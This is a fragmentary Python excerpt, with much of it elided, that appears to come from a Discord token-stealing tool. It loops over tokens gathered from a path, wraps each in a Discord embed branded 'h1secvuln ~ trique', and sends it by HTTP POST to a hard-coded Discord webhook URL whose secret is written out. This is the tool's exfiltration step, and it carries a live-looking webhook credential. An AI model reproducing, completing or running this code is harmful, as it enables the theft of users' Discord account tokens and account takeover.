        ...
        for token in gettokens(path):
            ...
            try:
                ...
                embed_user = {
                    'embeds': [
                        {
                            ...
                            'color': 3092790,
                            'footer': {
                                'text': "hi trique:3 • https://youtube.com/@treeeque"
                            },
                            'thumbnail': {
                    ...
                    "username": "h1secvuln ~ trique",
                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                }

                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1496845188021354557/rJqz4m0SEodFgoz_IUIORQuCxIfF6bklS3U6WAhmZ46yMQlX1nFcUpGjVi025bg7J6GB', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
